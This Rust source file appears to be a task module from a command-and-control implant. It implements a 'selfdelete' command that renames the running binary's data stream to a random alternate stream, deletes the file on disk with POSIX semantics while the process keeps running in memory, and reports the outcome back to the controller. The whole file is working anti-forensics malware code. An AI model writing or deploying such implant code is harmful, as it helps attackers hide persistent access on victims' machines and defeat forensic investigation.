use crate::transport;

use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use std::mem;
use std::ptr;

use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use winapi::um::fileapi::{CreateFileW, OPEN_EXISTING, SetFileInformationByHandle};
use winapi::um::winnt::{DELETE, SYNCHRONIZE, FILE_SHARE_READ, FILE_SHARE_WRITE, FILE_SHARE_DELETE};
use winapi::um::libloaderapi::GetModuleFileNameW;
use winapi::um::sysinfoapi::GetTickCount;
use winapi::um::processthreadsapi::GetCurrentProcessId;

const MAX_PATH_LEN: usize = 260;

// FILE_INFO_BY_HANDLE_CLASS enum values
const FILE_RENAME_INFO: u32 = 3;
const FILE_DISPOSITION_INFO_EX: u32 = 21;

// FILE_DISPOSITION_INFO_EX flags
const FILE_DISPOSITION_FLAG_DELETE: u32 = 0x1;
const FILE_DISPOSITION_FLAG_POSIX_SEMANTICS: u32 = 0x2;

#[repr(C)]
struct FileRenameInfo2 {
    replace_if_exists: u32,
    root_directory: usize,
    file_name_length: u32,
    file_name: [u16; MAX_PATH_LEN],
}

#[repr(C)]
struct FileDispositionInfoExData {
    flags: u32,
}

fn delete_self_from_disk() -> bool {
    unsafe {
        // Get own executable path
        let mut path_buf = [0u16; MAX_PATH_LEN * 2];
        let len = GetModuleFileNameW(
            ptr::null_mut(),
            path_buf.as_mut_ptr(),
            (MAX_PATH_LEN * 2) as u32,
        );
        if len == 0 {
            return false;
        }

        // Build random ADS name using tick count and PID
        let tick = GetTickCount();
        let pid = GetCurrentProcessId();
        let stream_name = format!(":{:x}{:x}", tick, pid);
        let stream_wide: Vec<u16> = OsStr::new(&stream_name)
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();

        // Prepare FILE_RENAME_INFO
        let mut rename_info: FileRenameInfo2 = mem::zeroed();
        rename_info.replace_if_exists = 0;
        rename_info.root_directory = 0;
        rename_info.file_name_length = ((stream_wide.len() - 1) * 2) as u32;
        let copy_len = stream_wide.len().min(MAX_PATH_LEN);
        ptr::copy_nonoverlapping(
            stream_wide.as_ptr(),
            rename_info.file_name.as_mut_ptr(),
            copy_len,
        );

        // Step 1: Open file with DELETE access
        let handle = CreateFileW(
            path_buf.as_ptr(),
            DELETE | SYNCHRONIZE,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            ptr::null_mut(),
            OPEN_EXISTING,
            0,
            ptr::null_mut(),
        );
        if handle == INVALID_HANDLE_VALUE {
            return false;
        }

        // Step 2: Rename the default data stream to an alternate data stream
        let ret = SetFileInformationByHandle(
            handle,
            FILE_RENAME_INFO,
            &rename_info as *const _ as *mut _,
            mem::size_of::<FileRenameInfo2>() as u32,
        );
        CloseHandle(handle);
        if ret == 0 {
            return false;
        }

        // Step 3: Reopen the file (now with renamed stream)
        let handle = CreateFileW(
            path_buf.as_ptr(),
            DELETE | SYNCHRONIZE,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            ptr::null_mut(),
            OPEN_EXISTING,
            0,
            ptr::null_mut(),
        );
        if handle == INVALID_HANDLE_VALUE {
            return false;
        }

        // Step 4: Mark for deletion with POSIX semantics
        let disposal_info = FileDispositionInfoExData {
            flags: FILE_DISPOSITION_FLAG_DELETE | FILE_DISPOSITION_FLAG_POSIX_SEMANTICS,
        };
        let ret = SetFileInformationByHandle(
            handle,
            FILE_DISPOSITION_INFO_EX,
            &disposal_info as *const _ as *mut _,
            mem::size_of::<FileDispositionInfoExData>() as u32,
        );
        CloseHandle(handle);

        ret != 0
    }
}

pub fn selfdelete(task: &serde_json::Value) -> Result<(), Box<dyn std::error::Error>> {
    let id = task.get("id").unwrap().as_str().unwrap();
    let timestamp = task.get("timestamp").unwrap().as_f64().unwrap();

    crate::helpers::churn(id);

    let success = delete_self_from_disk();

    let output = if success {
        "Self-delete successful. Binary removed from disk, process continues running in memory."
    } else {
        "Self-delete failed."
    };

    let response_json = serde_json::json!({
        "action": "post_response",
        "responses": [
            {
                "task_id": id,
                "user_output": output,
                "timestamp": timestamp,
                "status": if success { "success" } else { "error" },
                "completed": true,
            }
        ]
    });

    let response_value = serde_json::to_string(&response_json)?;
    transport::send_request(&response_value)?;

    Ok(())
}
